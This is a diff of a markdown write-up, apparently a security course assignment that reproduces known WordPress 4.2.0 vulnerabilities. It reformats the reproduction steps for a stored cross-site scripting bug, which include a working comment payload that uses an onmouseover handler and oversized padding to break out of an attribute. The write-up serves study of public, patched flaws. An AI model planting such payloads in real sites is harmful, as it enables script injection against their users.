@@ -12,7 +12,9 @@ Time spent: **10** hours spent in total
     - Tested in version: 4.2.0
     - Fixed in version: 4.2.1
   - [X] GIF Walkthrough: ![](HackOne.gif)
-  - [ ] Steps to recreate: Comment on a post with the following - <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  <insert greater than 63kb of any data>'></a>
+  - [ ] Steps to recreate: Comment on a post with the following -
+  > <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px   
+  > <insert greater than 63kb of any data>'></a>
   - [X] Affected source code: https://cedricvb.be/post/wordpress-stored-xss-vulnerability-4-1-2/
     - [Link 1](https://klikki.fi/adv/wordpress2.html)
 1. (Required) Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds
